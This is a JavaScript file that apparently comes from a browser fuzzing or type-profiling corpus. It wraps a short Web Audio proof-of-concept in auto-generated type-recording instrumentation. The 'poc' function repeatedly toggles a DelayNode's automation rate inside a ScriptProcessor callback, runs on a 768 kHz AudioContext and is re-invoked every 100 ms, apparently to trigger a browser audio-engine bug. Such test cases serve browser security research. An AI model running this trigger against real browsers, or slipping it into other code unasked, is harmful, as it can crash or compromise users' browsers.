var Inst0 = 0;
var Inst1 = 0;
var Inst2 = 0;
var Inst3 = 0;
var Inst4 = 0;
var Inst5 = 0;
var Inst6 = 0;
var Inst7 = 0;
var Inst8 = 0;
var Inst9 = 0;
var Inst10 = 0;
var Inst11 = 0;
var Inst12 = 0;
var Inst13 = 0;
var Inst14 = 0;
var Inst15 = 0;
var Inst16 = 0;
var Inst17 = 0;
var Inst18 = 0;
var Inst19 = 0;
var Inst20 = 0;
var Inst21 = 0;
var Inst22 = 0;
var Inst23 = 0;
var Inst24 = 0;
var Inst25 = 0;
var Inst26 = 0;
var Inst27 = 0;
var Inst28 = 0;
var Inst29 = 0;
var Inst30 = 0;
var Inst31 = 0;
var Inst32 = 0;
var Inst33 = 0;
 
function _TypeOfArray(a) {
	let number = true;	
	let string = true;
	for (let i = 0; i < a.length; i++) {
		if (number && (typeof a[i]) != "number") {
			number = false;	
		}
		if (string && (typeof a[i]) != "string") {
			string = false;	
		}
		if (!number && !string)
			break;
	}
	if (number)
		return "number";
	else if (string)
		return "string";
	else
		return "any";
}

function _TypeIsEqual(t1, t2) {
	return JSON.stringify(t1) === JSON.stringify(t2);
}

function _TypeOf(a, step) {
	var t;
	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
	if (type == "array") {
		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
	} else if (type == "object") {
		let shape = [];
        if (step === undefined || step > 0) {
            let keys = Object.keys(a);
            let length = Math.min(100, keys.length);
		    for (let i = 0; i < length; i++) {
			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
		    }
        }
		t = {type : type, extra: {shape: shape}};
	} else {
		t = {type : type};
	} 
	return t;
}

function _RecordType(loc, a) {
	var t = _TypeOf(a);
    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
}


try { if (Inst0 <= 1000 && typeof (poc) != "undefined") {_RecordType("<21,24,3>",(poc)); Inst0++; } } catch(e) {}
        function poc(){
try { if (Inst2 <= 1000 && typeof (AudioContext) != "undefined") {_RecordType("<55,67,4>",(AudioContext)); Inst2++; } } catch(e) {}
            let ctx = new AudioContext({sampleRate: 768000.0});
try { if (Inst1 <= 1000 && typeof (ctx) != "undefined") {_RecordType("<45,48,4>",(ctx)); Inst1++; } } catch(e) {}
try { if (Inst4 <= 1000 && typeof (ctx.createScriptProcessor) != "undefined") {_RecordType("<115,140,5>",(ctx.createScriptProcessor)); Inst4++; } } catch(e) {}try { if (Inst5 <= 1000 && typeof (ctx) != "undefined") {_RecordType("<115,118,5>",(ctx)); Inst5++; } } catch(e) {}
            let sp = ctx.createScriptProcessor();
try { if (Inst3 <= 1000 && typeof (sp) != "undefined") {_RecordType("<110,112,5>",(sp)); Inst3++; } } catch(e) {}
            sp.onaudioprocess = function (event) {
try { if (Inst8 <= 1000 && typeof (event) != "undefined") {_RecordType("<187,192,6>",(event)); Inst8++; } } catch(e) {}
                delay.delayTime.automationRate = "k-rate";
try { if (Inst9 <= 1000 && typeof (delay.delayTime.automationRate) != "undefined") {_RecordType("<213,243,7>",(delay.delayTime.automationRate)); Inst9++; } } catch(e) {}try { if (Inst10 <= 1000 && typeof (delay.delayTime) != "undefined") {_RecordType("<213,228,7>",(delay.delayTime)); Inst10++; } } catch(e) {}try { if (Inst11 <= 1000 && typeof (delay) != "undefined") {_RecordType("<213,218,7>",(delay)); Inst11++; } } catch(e) {}
                delay.delayTime.automationRate = "a-rate";
try { if (Inst12 <= 1000 && typeof (delay.delayTime.automationRate) != "undefined") {_RecordType("<273,303,8>",(delay.delayTime.automationRate)); Inst12++; } } catch(e) {}try { if (Inst13 <= 1000 && typeof (delay.delayTime) != "undefined") {_RecordType("<273,288,8>",(delay.delayTime)); Inst13++; } } catch(e) {}try { if (Inst14 <= 1000 && typeof (delay) != "undefined") {_RecordType("<273,278,8>",(delay)); Inst14++; } } catch(e) {}
            };
try { if (Inst6 <= 1000 && typeof (sp.onaudioprocess) != "undefined") {_RecordType("<157,174,6>",(sp.onaudioprocess)); Inst6++; } } catch(e) {}try { if (Inst7 <= 1000 && typeof (sp) != "undefined") {_RecordType("<157,159,6>",(sp)); Inst7++; } } catch(e) {}

try { if (Inst16 <= 1000 && typeof (ctx.createDelay) != "undefined") {_RecordType("<359,374,11>",(ctx.createDelay)); Inst16++; } } catch(e) {}try { if (Inst17 <= 1000 && typeof (ctx) != "undefined") {_RecordType("<359,362,11>",(ctx)); Inst17++; } } catch(e) {}
            let delay = ctx.createDelay(1);
try { if (Inst15 <= 1000 && typeof (delay) != "undefined") {_RecordType("<351,356,11>",(delay)); Inst15++; } } catch(e) {}
try { if (Inst18 <= 1000 && typeof (delay.delayTime.linearRampToValueAtTime) != "undefined") {_RecordType("<392,431,12>",(delay.delayTime.linearRampToValueAtTime)); Inst18++; } } catch(e) {}try { if (Inst19 <= 1000 && typeof (delay.delayTime) != "undefined") {_RecordType("<392,407,12>",(delay.delayTime)); Inst19++; } } catch(e) {}try { if (Inst20 <= 1000 && typeof (delay) != "undefined") {_RecordType("<392,397,12>",(delay)); Inst20++; } } catch(e) {}
            delay.delayTime.linearRampToValueAtTime(1, 2);
try { if (Inst21 <= 1000 && typeof (sp.connect(delay).connect) != "undefined") {_RecordType("<452,477,13>",(sp.connect(delay).connect)); Inst21++; } } catch(e) {}try { if (Inst22 <= 1000 && typeof (sp.connect) != "undefined") {_RecordType("<452,462,13>",(sp.connect)); Inst22++; } } catch(e) {}try { if (Inst23 <= 1000 && typeof (sp) != "undefined") {_RecordType("<452,454,13>",(sp)); Inst23++; } } catch(e) {}try { if (Inst24 <= 1000 && typeof (delay) != "undefined") {_RecordType("<463,468,13>",(delay)); Inst24++; } } catch(e) {}try { if (Inst25 <= 1000 && typeof (ctx.destination) != "undefined") {_RecordType("<478,493,13>",(ctx.destination)); Inst25++; } } catch(e) {}try { if (Inst26 <= 1000 && typeof (ctx) != "undefined") {_RecordType("<478,481,13>",(ctx)); Inst26++; } } catch(e) {}
            sp.connect(delay).connect(ctx.destination);
try { if (Inst27 <= 1000 && typeof (delay.delayTime.setValueAtTime) != "undefined") {_RecordType("<509,539,14>",(delay.delayTime.setValueAtTime)); Inst27++; } } catch(e) {}try { if (Inst28 <= 1000 && typeof (delay.delayTime) != "undefined") {_RecordType("<509,524,14>",(delay.delayTime)); Inst28++; } } catch(e) {}try { if (Inst29 <= 1000 && typeof (delay) != "undefined") {_RecordType("<509,514,14>",(delay)); Inst29++; } } catch(e) {}try { if (Inst30 <= 1000 && typeof (ctx.currentTime) != "undefined") {_RecordType("<544,559,14>",(ctx.currentTime)); Inst30++; } } catch(e) {}try { if (Inst31 <= 1000 && typeof (ctx) != "undefined") {_RecordType("<544,547,14>",(ctx)); Inst31++; } } catch(e) {}
            delay.delayTime.setValueAtTime( 5, ctx.currentTime); 
        }

try { if (Inst32 <= 1000 && typeof (setInterval) != "undefined") {_RecordType("<585,596,17>",(setInterval)); Inst32++; } } catch(e) {}try { if (Inst33 <= 1000 && typeof (poc) != "undefined") {_RecordType("<597,600,17>",(poc)); Inst33++; } } catch(e) {}
        setInterval(poc, 100);
    
